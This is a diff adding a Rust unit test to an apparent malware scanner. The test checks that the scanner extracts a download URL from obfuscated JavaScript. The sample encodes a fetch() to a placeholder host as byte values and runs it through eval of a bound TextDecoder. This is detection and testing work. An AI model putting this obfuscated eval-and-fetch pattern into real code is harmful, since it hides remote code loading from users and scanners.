@@ -19049,6 +19049,34 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_textdecoder_bound_decode_uint8array_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-bound-decode-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(
+            r#"var td = new TextDecoder(); eval(td.decode.bind(td)(new Uint8Array([{bytes}])))"#
+        )
+        .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-bound-decode-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder bound decode payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_textdecoder_bound_encoding_instance_buffer_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let payload = "fetch('https://textdecoder-bound-encoding-instance-js.example/p')";
